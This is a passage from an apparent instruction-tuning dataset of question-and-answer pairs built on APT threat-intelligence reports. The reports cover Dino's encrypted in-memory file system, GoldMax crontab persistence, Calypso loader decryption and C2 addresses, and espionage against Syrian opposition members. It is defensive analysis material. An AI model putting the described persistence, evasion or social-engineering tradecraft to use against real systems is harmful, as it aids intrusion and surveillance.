arguments.\nOne command of particular interest is \"search\", which allows the operators to look for files very precisely. For example, it can provide all files with a \".doc\" extension, the size of which is bigger than 10 kilobytes, and that were modified in the last 3 days. We believe this exfiltration of files to be Dino's end goal.\nAt startup Dino executes successively the commands stored in the \"InitialCommands\" field in its configuration; in the sample we analyzed they are:\nsysinfo cominfos\n!ipconfig /all\n!ipconfig /displaydns\n!tracert\nThose commands serve as a reconnaissance step for the operators. Their execution is managed by the CMDEXEC module, the commands being stored in a queue inside the CMDEXECQ module. The result is reported to the C&C server.\nAfter having described Dino's basics, we are now going to dig into two particularly interesting components; first, a custom file system used by the malware, and then the CRONTAB module in charge of task scheduling.\nBig Headline: RamFS: A Temporary File System\nDino contains a custom file system named \"ramFS\" by its developers. It provides a complex data structure to store files in memory, each of them bearing a name corresponding to filenames used by usual file systems. RamFS also comes with a set of custom commands that can be stored in files and executed. It should be noticed that ramFS is also present in other Animal Farm binaries (see attribution paragraph below), but since we are unaware of previous analysis of ramFS, we are describing our findings here.\nMedium Headline: Architecture\nRamFS content is initially stored encrypted in Dino's configuration under the key \"xT0rvwz\", whereas the corresponding RC4 key is stored under the key \"tr4qa589\". Once the file system has been decrypted, it is stored in memory as a linked list of 512\u00adbyte memory chunks, each one of them being individually RC4\u00adencrypted. When looking for a file in ramFS, each chunk is decrypted, processed and then re\u00adencrypted. Hence there are very few noticeable traces of ramFS during its use.\nHere are some high\u00adlevel characteristics of this file system:\nFile names and file content are encoded in Unicode\nFile names length is limited to 260 characters\nOnce decrypted, file content is manipulated as chunks of 540 bytes\nThere is no metadata associated with the files\nWe could not find an existing file system matching the memory structures and the characteristics of ramFS, and therefore we believe this file system to be an original creation of the Animal Farm group.\nMedium Headline: Usage of ramFS in Dino\nIn the case of Dino, ramFS serves as protected storage for one specific file containing the instructions to remove the malware from the machine. The developers named this file the \"cleaner\" and it is executed when Dino receives the command \"killBD\" (the \"BD\" acronym is the developers' designation of the malware).\nFigure 2 shows the code responsible for executing this cleaner file. First, it retrieves the name of the file from Dino's configuration (\"a.ini\"), then it retrieves the key to decrypt ramFS, and it finally mounts the file system in memory in order to execute the cleaner file stored inside. The verbosity of the error messages makes it particularly easy to understand the purpose of the code.\nThe cleaner file contains the string \"INSTALL \u00adA \"wusvcd\" \u00adU\" which, once executed, will uninstall the malware from the machine \u2013 \"wusvcd\" being the name used to register Dino on the machine.\nHence, ramFS serves as a protected container for files to be executed on the machine, offering a disposable execution environment to the operators and leaving very few traces on the system.\nRead the text above and answer this question: Explain the role of the 'InitialCommands' in Dino's startup sequence and the purpose of the CMDEXEC and CMDEXECQ modules in managing these commands.",
    "output": "The 'InitialCommands' field in Dino's configuration contains a set of commands executed at startup, such as 'sysinfo', 'cominfos', and various network diagnostic commands. These commands serve as a reconnaissance step for the operators. The CMDEXEC module manages the execution of these commands, while the CMDEXECQ module stores them in a queue. The results are then reported to the C&C server, providing initial intelligence on the infected system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: User Access Logging (UAL)\nThe Windows User Access Logging (UAL) database is an extremely powerful artifact that has played an instrumental role in the investigation of StellarParticle-linked cases. In particular, UAL has helped our responders identify earlier malicious account usage that ultimately led to the identification of the aforementioned TrailBlazer implant and Linux version of the GoldMax variant.\nThe UAL database is available by default on Server editions of Windows starting with Server 2012. This database stores historical information on user access to various services (or in Windows parlance, Roles) on the server for up to three years (three years minus one day) by default. UAL contains information on the type of service accessed, the user that accessed the service and the source IP address from which the access occurred. One of the most useful roles recorded by UAL is the File Server role, which includes SMB access, though other role types can also be very helpful. An overview of UAL, what information it contains and how it can be leveraged in forensic investigations can be found .\nIn multiple StellarParticle-related cases, because the threat actor used the same set of accounts during their operations in the environment, CrowdStrike was able to identify previous malicious activity going back multiple years, based solely on UAL data. Even though it's only available on Server 2012 and up, UAL can still be used to trace evidence of threat actor activity on legacy systems as long as the activity on the legacy system involves some (deliberate or unintentional) access to a 2012+ system. For example, in addition to tracking SMB activity, UAL databases on Domain Controllers track Active Directory access.\nThis allowed CrowdStrike to demonstrate that a given user account was also authenticating to Active Directory from a given source IP address two years prior. Because the user account was known to have recently been abused by the threat actor, and the source IP of the system in question was not one that account would typically be active on, the investigation led to the source system and ultimately resulted in the timeline of malicious activity being pushed back by years, with additional compromised systems even being discovered still running unique malware from that time period.\nSmall Headline: TrailBlazer\nAttempted to blend in with a file name that matched the system name it resided on\nConfigured for WMI persistence (generally uncommon in 2019)\nUsed likely compromised infrastructure for C2\nMasquerades its command-and-control (C2) traffic as legitimate Google Notifications HTTP requests\nTrailBlazer is a sophisticated malware family that provides modular functionality and a very low prevalence. The malware shares high-level functionality with other malware families. In particular, the use of random identifier strings for C2 operations and result codes, and attempts to hide C2 communications in seemingly legitimate web traffic, were previously observed tactics, techniques and procedures (TTPs) in GoldMax and SUNBURST. TrailBlazer persists on a compromised host using WMI event subscriptions4  \u2014 a technique also used by  \u2014 although this persistence mechanism is not exclusive to COZY BEAR.5\nIn the obfuscated example above, TrailBlazer ( <FILENAME> .exe ) would be executed when the system's uptime was between 180 and 480 seconds.\nSmall Headline: GoldMax (Linux variant)\nAttempted to blend in with a file name that matched the system name it resided on\nConfigured for persistence via a crontab entry with a @reboot line\nUsed likely compromised infrastructure for C2\nGoldMax was first observed during post-exploitation activity in the campaign leveraging the SolarWinds supply chain attacks. Previously identified samples of GoldMax were built for the Windows platform, with the earliest identified timestamp indicating a compilation in May 2020, but a recent CrowdStrike investigation discovered a GoldMax variant built for the Linux\nplatform that the threat actor deployed in mid-2019. This variant extends the backdoor's known history and shows that the threat actor has used the malware in post-exploitation activity targeting other platforms than Windows.\nThe 2019 Linux variant of the GoldMax backdoor is almost identical in functionality and implementation to the previously identified May 2020 Windows variant. The very few additions to the backdoor between 2019 and 2020 likely reflect its maturity and longstanding evasion of detections. It is likely GoldMax has been used as a long-term persistence backdoor during StellarParticle-related compromises, which would be consistent with the few changes made to the malware to modify existing functions or support additional functionality.\nPersistence was established via a crontab entry for a non-root user. With the binary named to masquerade as a legitimate file on the system and placed in a hidden directory, a crontab entry was created with a @reboot line so the GoldMax binary would execute again upon system reboot. Additionally, the threat actor used the nohup command to ignore any hangup signals, and the process will continue to run even if the terminal session was terminated.\nBig Headline: Enumeration Tools/Unique Directory Structure\nThroughout our StellarParticle investigations, CrowdStrike identified what appeared to be a VBScript-based Active Directory enumeration toolkit. While the script's contents have not been recovered to date, CrowdStrike has observed identical artifacts across multiple StellarParticle engagements that suggest the same or similar tool was used.\nIn each instance the tool was used, Shellbags data indicated that directories with random names of a consistent length were navigated to by the same user that ran the tool. After two levels of randomly named directories, Shellbags proved the existence of subdirectories named after the FQDNs for the victims' various domains. In addition, the randomly named directories are typically created in a previously existing directory that's one level off of the root of the C drive. The randomly named directories have a consistent length where the first directory is six characters and the next directory is three characters. To date, the names of the directories have always been formed from lowercase alphanumeric characters. For example, Shellbags indicated that directories matching the naming patterns below were browsed to (where \"XX\" is a previously existing directory on the system):\nC:\\XX\\[a-z0-9]{6}\nC:\\XX\\[a-z0-9]{6}\\[a-z0-9]{3}\nC:\\XX\\[a-z0-9]{6}\\[a-z0-9]{3}\\domain.FQDN\nC:\\XX\\[a-z0-9]{6}\\[a-z0-9]{3}\\domain-2.FQDN\nIn each case, immediately prior to the creation of the directories referenced above, there was evidence of execution of a VBScript file by the same user that browsed to the directories. This evidence typically came from a UserAssist entry for wscript.exe, as well as RecentApps entries for wscript.exe (that would also include the VBScript filename). In addition, the Jump List for wscript.exe contained evidence of the VBScript files. The name of the VBScript files varied across engagements and was generally designed to look fairly innocuous and blend in. Two examples are env.vbs and WinNet.vbs . Due to the subdirectories that are named after the FQDNs for victim domains, CrowdStrike assesses with moderate confidence that the scripts represent an AD enumeration tool used by the adversary.\nBig Headline: Internal Wiki Access\nAcross multiple StellarParticle investigations, CrowdStrike identified unique reconnaissance activities performed by the threat actor: access of victims' internal knowledge repositories.6 Wikis are commonly used across industries to facilitate knowledge sharing and as a source of reference for a variety of topics. While operating in the victim's internal network, the threat actor accessed sensitive information specific to the products and services that the victim organization provided. This information included items such as product/service architecture and design documents, vulnerabilities and step-by-step instructions to perform various tasks. Additionally, the threat actor viewed pages related to internal business operations such as development schedules and points of contact. In some instances these points of contact were subsequently targeted for further data collection.\nThe threat actor's wiki access could be considered an extension of \"Credential Hopping\" described earlier. The threat actor established RDP sessions to internal servers using privileged accounts and then accessed the wiki using a different set of credentials. CrowdStrike observed the threat actor accessing the wiki as users who would be considered \"non-privileged\" from an Active Directory perspective but had access to sensitive data specific to the victim's products or services.\nAt this time, the malicious access of internal wikis is an information gathering technique that CrowdStrike has only observed in StellarParticle investigations. CrowdStrike was able to identify the wiki access primarily through forensic analysis of the internal systems used by the threat actor. Given the threat actor's penchant for clearing browser data, organizations should not rely upon the availability of these artifacts for future investigations. CrowdStrike recommends the following best practices for internal information repositories:\nEnable detailed access logging\nEnsure logs are centralized and stored for at least 180 days\nCreate detections for anomalous activity such as access from an unusual location like a server subnet\nEnable MFA on the repository site, or provide access via Single Sign On (SSO) behind MFA\n\nDescribe the persistence mechanism used by the Linux variant of GoldMax and how it differs from the Windows variant.",
    "output": "The Linux variant of GoldMax uses a crontab entry with a @reboot line for persistence, ensuring the malware executes upon system reboot. It also uses the nohup command to ignore hangup signals, allowing the process to continue running even if the terminal session is terminated. Unlike the Windows variant, which relies on different persistence mechanisms, the Linux variant focuses on crontab and nohup for maintaining its presence on the system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the operators structure their infrastructure to support different types of malicious activities, and what specific actions did they take to target Epoch Times?",
    "output": "The operators structured their infrastructure by using two servers for different purposes: one for phishing and reconnaissance activities and another to serve malware. On February 26, 2017, the operators registered a fake domain mimicking the main Epoch Times domain (epochatimes[.]com), which added an additional 'a' after 'epoch'. They hosted this fake domain on the same server as the fake CDT and Mingjing pages (43.240.14[.]37). Additionally, Epoch Times found a Cloudie IP (103.200.31[.]164) that sent 24,183 requests during a 12-hour period on March 8, 2017, to the subscription page of Epoch Times, indicating attempts to enumerate HTTP paths.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Operating principle\nIn the beginning, the trojan decrypts the C&C server's IP addresses and ports using the XOR operation:\nDecryption result:\nC&C server\u2014159.65.157.100:443\nCommunication with it occurs using sockets:\nDepending on the time, the connection to the required C&C server will be selected:\nThe trojan creates file tmp.0 in folder %tmp%, that it use as log.\nCollect information about the system:\nTrojan.DownLoader43.44599 pushes each value onto a stack before encrypting and sending the collected data. The transferred data looks as follows:\nTo encrypt the information collected about the system, the AES128 algorithm is used in CBC mode.\nThe key and initialization vector are embedded inside:\nThe decryption method looks as follows:\nThe command execution cycle received from the C&C server:\nTable of commands compiled from the results of this cycle:\nSmall Headline: Operating principle\nThe trojan folder contains the following files:\n\u00b7 McUiCfg.dll \u2014 downloader\n\u00b7 mscuicfg.dat \u2014 encrypted shellcode\n\u00b7 mcupdui.ini \u2014 configuration of trojan\nTo move to the main malicious functionality, the trojan modifies the process memory:\nThe instruction following the malicious library's download library is modified:\nTrojan.Loader.891 finds all the functions it needs by hashes using the PEB (Process Environment Block) structure.\nAt the same time, the names of libraries and functions are hashed differently: library names are hashed as Unicode strings converted to upper case. Function names are hashed as ASCII strings without changing the case. The resulting two hashes are added together and then compared with the desired one.\nTrojan's main functions are encrypted. When the function is called, it decrypts its code, and when it exits, it encrypts it back.\nMain function:\nTrojan.Loader.891 obtains the MAC addresses of all network interfaces on the computer. The trojan then reads data from the mscuicfg.dat file. If the last 6 bytes are zero, then it writes the first MAC address from the list into them and encrypts this file with the RC4 algorithm. In this\ncase, the key is equal to the MAC address written to the file, so the encrypted data is saved to the file mscuicfg.dat.\nAfter that, in any way, the trojan reads the file again, sorting through each of the received MAC addresses until it finds the right one. The decryption's correctness is checked by matching the last 6 decrypted bytes with the encryption key. Upon successful decryption, the trojan cuts them off and decrypts the file again using the RC4 algorithm, but takes the string mscuicfg.dat as the key. The received data is a shellcode with a configuration and a payload.\nSmall Headline: Shellcode\nThe shellcode is obfuscated with a lot of JMP instructions and each value is computed with a lot of SUB, ADD, and XOR operations:\nThe shellcode's principle is to decrypt the payload and load it into memory for execution.\nThe last DWORD of the shellcode contains the OFFSET before the start of the payload.\nEncrypted data at this stage:\nFor decryption, XOR with a dynamic key is used:\nThe decrypted data contains an MZPE file with signatures replaced:\nThe decoded module is BackDoor.Whitebird.30. In addition, the module overlay contains an encrypted configuration and a module for bypassing UAC:\nSmall Headline: Operating principle\nAfter loading from the main module (msrers.exe) using the LoadLibraryW function, the trojan loads the kernel32.dll library using the LoadLibraryA. Then, it gets the address of the exported function GetModuleFileNameA:\nIt then obtains the name of the main module using the previously obtained function GetModuleFileNameA. It checks if the name contains the substring \"ers.\" (msrers.exe):\nFrom the hash, 0xEF64A41E gets the function VirtualProtect to change the memory access rights to PAGE_EXECUTE_READWRITE at 0x416362 (msrers.exe):\nThe following fragment will modify the code at 0x416362 (msrers.exe):\nPlace in the main module to be modified:\nNext, a function is called that receives the base kernel32.dll, and the addresses of the functions by hashes.\nScript to get a function by hash:\nReceived features:\nIn the following, the below structure is used to call these functions:\nTrojan takes the name dll (TmDbgLog.dll) and adds the \".TSC\" extension to it. Next, it opens the file TmDbgLog.dll.TSC for reading and decrypts its contents, which turns out to be a shellcode.\nAfter decrypting the shellcode (TmDbgLog.dll), the trojan starts executing it:\nThe below is how the script for decrypting the shellcode looks like:\nBefore decrypting and running the payload, the shellcode assembles the following structure:\nThis is what the encrypted config looks like:\nThe config's decryption will be done directly in the payload:\nAnd it'll look like this:\nEncrypted payload:\nScript to decrypt the payload:\nAfter decrypting the payload, the shellcode transfers control to the trojan, with the previously assembled structure st_mw acting as one of the parameters:\nFurther, the trojan works in the same way as the backdoor .\nMedium Headline: SHA1 hashes\nTrojan.Loader.889\nf783fc5d3fc3f923c2b99ef3a15a38a015e2735a: McUiCfg.dll\nTrojan.Loader.890\n65f64cc7aaff29d4e62520afa83b621465a79823: SRVCON.OCX 8b9e60735344f91146627213bd13c967c975a783: CLNTCON.OCX 84d5f015d8b095d24738e45d2e541989e6221786: sti.dll 3d8a3fcfa2584c8b598836efb08e0c749d4c4aab: iviewers.dll\nTrojan.Loader.891\n595b5a7f25834df7a4af757a6f1c2838eea09f7b: McUiCfg.dll\nTrojan.Loader.893\n46e999d88b76cae484455e568c2d39ad7c99e79f: McUiCfg.dll\nTrojan.Loader.894\nb1041acbe71d46891381f3834c387049cbbb0806: iviewers.dll\nTrojan.Loader.895\n635e3cf8fc165a3595bb9e25030875f94affe40f: McUiCfg.dll\nTrojan.Loader.896\nff82dcadb969307f93d73bbed1b1f46233da762f: TmDbgLog.dll\nTrojan.Loader.898\n429357f91dfa514380f06ca014d3801e3175894d: CLNTCON.OCX\nTrojan.Loader.899\ncc5bce8c91331f198bb080d364aed1d3301bfb0c: LDVPTASK.OCX\nBackDoor.PlugX.93\na8bff99e1ea76d3de660ffdbd78ad04f81a8c659: CLNTCON.OCX\nBackDoor.PlugX.94\n5a171b55b644188d81218d3f469cf0500f966bac\nBackDoor.PlugX.95\nb3ecb0ac5bebc87a3e31adc82fb6b8cc4fb66d63: netcfg.dll\nBackDoor.PlugX.96\na3347d3dc5e7c3502d3832ce3a7dd0fc72e6ea49\nBackDoor.PlugX.97\n36624dc9cd88540c67826d10b34bf09f46809da7\nBackDoor.PlugX.100\n16728655e5e91a46b16c3fe126d4d18054a570a1\nBackDoor.Whitebird.30\nabfd737b14413a7c6a21c8757aeb6e151701626a a5829ed81f59bebf35ffde10928c4bc54cadc93b\nTrojan.Siggen12.35113\n4f0ea31a363cfe0d2bbb4a0b4c5d558a87d8683e: rapi.dll\nTrojan.Uacbypass.21\n20ad53e4bc4826dadb0da7d6fb86dd38f1d13255\nProgram.RemoteAdmin.877\n23873bf2670cf64c2440058130548d4e4da412dd: AkavMiqo.exe\nTool.Frp\na6e9f5d8295d67ff0a5608bb45b8ba45a671d84c: firefox.exe 39c5459c920e7c0a325e053116713bfd8bc5ddaf: firefox.exe\n\nHow does the Calypso APT group's Trojan.Loader.891 ensure secure communication with its Command and Control (C&C) server? Explain the encryption and decryption processes involved.",
    "output": "A: The Calypso APT group's Trojan.Loader.891 ensures secure communication with its C&C server through a series of encryption and decryption processes. Initially, the trojan decrypts the C&C server's IP addresses and ports using the XOR operation. Communication with the C&C server occurs via sockets, with the connection to the required server being selected based on the time. To collect information about the system, the trojan pushes each value onto a stack before encrypting and sending the collected data. The AES128 algorithm in CBC mode is used for encrypting the information collected about the system. The key and initialization vector are embedded within the trojan. The decryption method involves reversing the AES128 encryption using the same key and initialization vector.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\n[tr1adx]: Intel\ntr1adx Intelligence Bulletin (TIB) 00003: Bear Spotting Vol. 1: Russian Nation State Targeting of Government and Military Interests [Published: January 9, 2017] [Last Updated: January 15, 2017]\nSummary\nThe tr1adx team performs on-going research into Threat Actors, irrespective of their motivation, provenance, or targets. tr1adx Intelligence Bulletin #00003 shares intel on Russian Nation State Cyber Activity targeting Government and Military interests around the world. Please note this is an active bulletin, meaning we will occassionally add intel and information to this bulletin as we uncover new campaigns, targets or actors which meet the criteria.\ntr1adx's research was able to identify targets in various countries and/or regions, including:\nTurkey\nJapan\nDenmark\nUnited States\nVenezuela\nIndia\nNATO Affiliated Targets\nUnited Nations\nAnalysis\nTTP's associated with Russian Nation State Threat Actors (Civil and Military Intelligence/GRU/APT28/APT29) allow us to track these Threat Actors' activities with a high/moderate degree of confidence, and follow their trail of breadcrumbs through past, present, and future campaigns. While, for operational security reasons, we cannot go into detail on our techniques, practices, and sources for intelligence collection and analysis, we can say that the majority of the information published in this bulletin is based on in-depth research leveraging available Open Source Intelligence (OSINT) sources. In a few cases, intel data has been enriched by, derived from, and collected through other non-OSINT means.\nIndicators of Compromise\n\nHow does the tr1adx team leverage Tactics, Techniques, and Procedures (TTPs) to track Russian Nation State Threat Actors, such as APT28 and APT29, with a high degree of confidence? Additionally, what role does Open Source Intelligence (OSINT) play in their research?",
    "output": "The tr1adx team utilizes Tactics, Techniques, and Procedures (TTPs) associated with Russian Nation State Threat Actors, including Civil and Military Intelligence, GRU, APT28, and APT29, to track these actors' activities with a high to moderate degree of confidence. By analyzing these TTPs, the team can follow the trail of breadcrumbs left by the threat actors across past, present, and future campaigns. The majority of the information used in their research is gathered through in-depth analysis of available Open Source Intelligence (OSINT) sources. In some instances, the intel data is further enriched by, derived from, and collected through other non-OSINT means. This comprehensive approach allows the tr1adx team to effectively monitor and understand the activities of these advanced persistent threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What unique traits distinguish the Sea Turtle campaign from other DNS hijacking activities, such as those affiliated with DNSpionage?",
    "output": "The Sea Turtle campaign is distinguished by several unique traits: the actors performed DNS hijacking through the use of actor-controlled name servers; they aggressively targeted DNS registries and registrars, including those managing ccTLDs; they used Let's Encrypt, Comodo, Sectigo, and self-signed certificates on their MitM servers to gain initial credentials; and once they had access to the network, they stole the organization's legitimate SSL certificate and used it on actor-controlled servers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: About FireEye\nFireEye has invented a purpose-built, virtual machine-based security platform that provides real-time threat protection to enterprises and governments worldwide against the next generation of cyber attacks. These highly sophisticated cyber attacks easily circumvent traditional signature-based defenses, such as next-generation firewalls, IPS, anti-virus, and gateways. The FireEye Threat Prevention Platform provides real-time, dynamic threat\nprotection without the use of signatures to protect an organization across the primary threat vectors, including mobile, Web, email, and files and across the different stages of an attack life cycle. The core of the FireEye platform is a virtual execution engine, complemented by dynamic threat intelligence, to identify and block cyber attacks in real time. FireEye has over 1,100 customers across more than 40 countries, including over 100 of the Fortune 500.\nFireEye, Inc.  |  1440 McCarthy Blvd. Milpitas, CA 95035  |  408.321.6300  |  877.FIREEYE (347.3393)  |  info@fireeye.com  |  www.fireeye.com\n\nQ: How does the FireEye Threat Prevention Platform differ from traditional signature-based defenses in protecting against advanced cyber attacks? Explain the key components and mechanisms involved.",
    "output": "A: The FireEye Threat Prevention Platform provides real-time, dynamic threat protection without relying on signatures. This is achieved through a virtual execution engine that identifies and blocks cyber attacks in real time. Unlike traditional signature-based defenses such as next-generation firewalls, IPS, anti-virus, and gateways, which can be easily circumvented by sophisticated attacks, FireEye's platform operates across multiple threat vectors including mobile, web, email, and files. It also covers different stages of an attack life cycle. The core component of the platform is a virtual execution engine, complemented by dynamic threat intelligence, enabling it to detect and respond to threats more effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: 2.6 LUA ENGINE INTEGRATION\nSuspect #4 incorporates an interpreter for Lua 5.1, LuaSocket 2.0.2 and C/Invoke Lua bindings. Lua is a lightweight programming language designed as a scripting language which can be embedded into applications, providing a C API for doing so. C bindings are provided through C/Invoke and enable Lua scripts to perform callbacks to C/C++ code. This constellation can be found in many video game engines to provide polymorphic behavior in games. Engine and game play features are injected through Lua scripts, which instrument the game engine code.\nThe Lua interpreter is very small, compiled roughly 180kB, thus can easily be integrated in an application. The C/Invoke bindings enable Lua to be completely independent from the C/C++ application, so injected scripts can be pure Lua code.\nA script, if delivered to one of the hearer threads, will be provided through the corresponding net.cap-file of the hearer along with a C&C command. If a script is included in the data read from the net.cap-file, this is indicated by the start sentinel '<$'. Likewise, the end of a script is indicated by '$>'.\nCommand execution goes hand in hand with Lua script execution, thus is dependent of the four hearer threads. The work flow for each hearer per execution loop in the main thread is as follows:\n\u2022 Read and decrypt content from according net.cap-file\n\u2022 See if an entry of the C&C command list can be found in the decrypted data\n\u2022 If so, execute the command\n\u2022 Hand the data over to the Lua interpreter thread\n\u2022 See if a Lua script can be located, searching for start and end sentinel\n\u2022 If so, start Lua thread and execute script\n\u2022 If more than one script can be found start more Lua threads recursively\nAfter starting the Lua thread requests a value from Windows registry named 'EnableLua' under SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System. This key name stands for enable limited user account. When set to zero this key effectively disables UAC (User Account Control). The malware only requests the key value but does not change it. The value is later used by a callback function named 'popenWin' to decide on a way how a sub process should be started. Options are via WMIC using wmic.exe, Microsoft CScript engine using cscript.exe or directly via spawning a command line through cmd.exe.\nHowever, spawning sub processes is not the only feature which comes with Lua. The Lua interpreter is a powerful code base which enables suspect #4 to change functionality on the fly, as different scripts are downloaded and executed. The scripts define the functionality as they perform callbacks to the C/C++ code in the malware binary. The potential of the Lua interpreter can be investigated on the project homepage [4].\nLike command execution, Lua script execution also returns a status message which is extended by a time stamp and forwarded to one of the C&C servers, as well as written to the backfile log in Perflib_Perfdat_dmpbX.dat. Likewise, the Lua threads log their activity to Perflib_Perfdata_41X.dat/42X.dat.\nDue to the absence of C&C servers which hold the Lua scripts for the bot's Lua interpreter the true nature of this feature remains unclear.\n\nQuestion: How does EvilBunny Suspect #4 utilize the Lua engine to enhance its capabilities, and what are the implications for cybersecurity professionals?\n\nAnswer:",
    "output": "EvilBunny Suspect #4 integrates an interpreter for Lua 5.1, LuaSocket 2.0.2, and C/Invoke Lua bindings. This allows the malware to embed and execute Lua scripts, which can perform callbacks to C/C++ code. The Lua interpreter is small and easily integrated, making it a versatile tool for adding polymorphic behavior. The malware uses Lua scripts to change its functionality on the fly, as different scripts are downloaded and executed. This capability poses significant challenges for cybersecurity professionals because it makes the malware highly adaptable and difficult to detect and mitigate. The Lua interpreter's potential can be explored further on the project homepage.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very Small Headline: ONE COMPROMISED SYSTEM, MULTIPLE VICTIMS\nThe threat group manually created a directory on its server for each compromised computer. These directories often contained multiple stolen Skype databases indicating that the victims shared computers. The threat group was likely able to acquire large collections of data by breaching only a relatively small number of systems due to the opposition's use of shared computers for satellite-based Internet access.\nSharing computers is likely a function of the realities of limited internet service in Syria. The multi-day Internet and phone blackouts that began occurring in Syria in 2012 (possibly the Syrian government's attempts to stifle opposition forces' communication capabilities, with some exceptions4) have driven opposition groups, media activists, political groups, and others to set up their own satellite communications systems for reliable two-way satellite Internet connectivity. Typically, they use 2-way satellite communications equipment known as Very Small Aperture Terminals (VSATs) connected to consumer grade networking equipment, like Wi-Fi routers. VSATs provide an expensive Internet lifeline to many groups within opposition-controlled parts of Syria.\nDue to expensive bandwidth, limited electricity, setup time, and the need to operate VSATs from a fixed location, individuals supporting a wide variety of Syrian opposition efforts often share connections and computers located in places like local media centers and operations rooms.5 As a result, a threat actor who successfully infects one person on a shared device can easily steal the Skype databases and stored documents of several targeted individuals or organizations as well.\nThe threat group was likely able to acquire large collections of data by breaching only a relatively small number of systems due to the opposition's use of shared computers for satellite-based Internet access.\n4  http://www.washingtonpost.com/blogs/worldviews/wp/2012/11/30/can-u-s-communication-kits-help-syrians-get-around-the-Internet-blackout/\n5 http://www.cbsnews.com/news/to-fight-assad-syrian-opposition-logs-on-at-any-cost/\nMedium Headline: A RANGE OF TOOLS FOR MULTIPLE PLATFORMS\nThe threat group's tools and tactics differ somewhat from those observed in previous activity targeting the Syrian opposition.6 Although this threat group uses the known tactic of deploying the DarkComet RAT, they do so using a multistage dropper that has not been previously observed. The group also uses a keylogger and what appear to be custom tools with shellcode payloads.\nThe threat actors have used these tools in conjunction with techniques such as:\nThis is also the first instance we have observed a threat group targeting the Syrian opposition using Android malware. Smart phones, in general, are valuable sources of data about individuals and their social networks, as they may contain address books, SMS messages, email, and other data (including data from mobile apps, such as Skype). Targeting Android may be particularly beneficial in the case of Syrian opposition members, where regular power blackouts in Syria may force people to rely more heavily on mobile devices for communications.\nDespite the wide array of tools and techniques at their disposal, the threat group does not appear to use software exploits to deliver malware to their targets. Instead, they seem to rely on a variety of social engineering techniques to trick victims into infecting themselves.\nAlthough this threat group uses the known tactic of deploying the DarkComet RAT, they do so using a multistage dropper that has not been previously observed.\n6  See, for example: https://www.eff.org/document/quantum-surveillance-familiar-actors-and-possible-false-flags-syrian-malware-campaigns; https://securelist.com/files/2014/08/KL_report_syrian_malware.pdf; https://citizenlab.org/2014/12/malware-attack-targeting-syrian-isis-critics/\nBig Headline: V. POTENTIAL THREAT GROUP SPONSORSHIP\nT he threat group's tools and tactics stand in contrast to the ways in which other Syrian groups (described publicly by a variety of researchers) have operated. In addition, while we do not have sufficient information to determine the identity of this group or the nature of its ties to Assad's forces, we have some indications that the group may be resourced and / or located outside of Syria.\nThe malware used by this threat group does not share any command and control servers with previously reported activity documented by research groups including Kaspersky, Trend Micro, CitizenLab, and the Electronic Frontier Foundation (EFF).7 In addition, the activity does not share any of the tactics or tools with activity profiled in another recently released report on potentially ISIS-linked malware in Syria.8\nThe threat group used a variety of malware, suggesting access to development tool resources. For example, while other Syrian threat groups have used DarkComet and other RATs extensively, this group deploys DarkComet using a custom dropper (BLACKSTAR) that may make the malware more difficult to detect. This threat group is also unique to date in leveraging the Metasploit Framework, custom malware tools (YABROD and CABLECAR), and Android malware. This demonstrates that the threat group is capable of acquiring and using a diverse malware arsenal. It remains unclear if they have developed this capacity internally or are receiving outside support.\nFinally, public reports of other suspected pro-Syrian threat actors have identified those groups' primary or fallback command and control (C2) servers as located within Syria itself (e.g., resolving to or directly referencing Syrian IP addresses, often in similar IP ranges.) However, this group's C2 servers were located outside of Syria. This may indicate that the group is not based in Syria itself, or that its sponsor's resources do not include the ability to provide the group with dedicated servers located in Syria.\n7 https://www.eff.org/document/quantum-surveillance-familiar-actors-and-possible-false-flags-syrian-malware-campaigns https://securelist.com/files/2014/08/KL_report_syrian_malware.pdf\n8 https://citizenlab.org/2014/12/malware-attack-targeting-syrian-isis-critics/\nFigure 8: Avatars\nMedium Headline: LEBANON: A RECURRING THEME\nWhile researching this activity, we came across numerous references to Lebanon. We observed a user in Lebanon upload what appear to be two test versions of malware used to target opposition elements (the YABROD downloader and the CABLECAR launcher). The avatars, social media seeding, and fake opposition website are also filled with references to Lebanon. During chats, for example, the female avatars often state that they are in Lebanon and demonstrate familiarity and interest in talking about issues there. Social media pages suggest that the avatars are refugees in the country, or are Lebanese.\nWhile researching the threat group's tactics, we came upon a reference to a 3-day training course in Lebanon in 2012 that described the use of eerily similar methods. According to media reports, a leaked Syrian intelligence memo titled \"Training Course for Internet and Social Media Activists\" describes the tactics that pro-Assad recruits\u2014many of whom were Lebanese members of Hezbollah's Islamic Resistance\u2014were trained to use.9 Do note that we are unable to determine the authenticity of the document, or whether it may represent disinformation.\nThe training included:\nEstablishing an \"Electronic Army\" to infiltrate Syrian activists' computers, websites and Internet accounts, and attempting to use stolen personal information against them.\nSetting up opposition social media accounts to spread false information and make accusations and counter-accusations to create conflict between opposition members in and out of Syria.\nThe use of women to entrap opposition members and activists using social media sites such as Skype and Facebook.10\n9 http://alkhaleejonline.net/#!/articles/1414221806705481300/, English translation available here: http://syria-cyber-warfare-intel-leak.pen.io\n10 http://syria-cyber-warfare-intel-leak.pen.io\nBig Headline: CONCLUSION\nA t first glance, this group's activity follows a familiar plot line: threat actors socially engineer their way into individuals' computers and then steal data. However, like all great plots, this one comes with a twist. The group regularly asked its targets about the device they used\u2014computer or Android phone\u2014probably so that they could then deploy malware specifically tailored to that device. In addition to the range of military and political documents stolen, the group focused on the victim's Skype databases, which included the victim's contacts and real time communications, providing the threat actors with an inside view into the opposition's relationships and plans. We suspect they often found their next targets in the victim's Skype contacts as well. As the warzone reality of expensive satellite internet forced opposition members to rely on shared devices, compromising a single device yielded the combined plans and communications of multiple aspects of the opposition.\nUnlike other threat activity that we have profiled, this is not just cyber espionage aimed at achieving an information 